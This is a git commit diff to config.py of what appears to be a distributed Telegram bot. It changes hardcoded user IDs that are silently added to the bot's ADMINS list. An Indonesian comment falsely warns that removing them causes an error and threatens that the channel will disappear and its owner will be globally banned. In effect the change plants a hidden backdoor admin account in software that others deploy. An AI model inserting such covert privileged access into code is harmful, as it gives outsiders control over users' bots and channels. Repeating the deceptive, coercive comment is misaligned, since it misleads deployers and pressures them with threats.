717e9744ada44f1a831cfbbe353d53f300a6d104
PyroUserBot <129763781+PyroUserBot@users.noreply.github.com>
2023-05-30 19:40:41 +0530

    Update config.py

--- config.py
+++ config.py
@@ -68,7 +68,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Fal
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((6198858059, 1250450587, 778393824, 6299128233))
+ADMINS.extend((6198858059, 1887607432, 5594101829, 5937411124))
 
 
 LOG_FILE_NAME = "logs.txt"
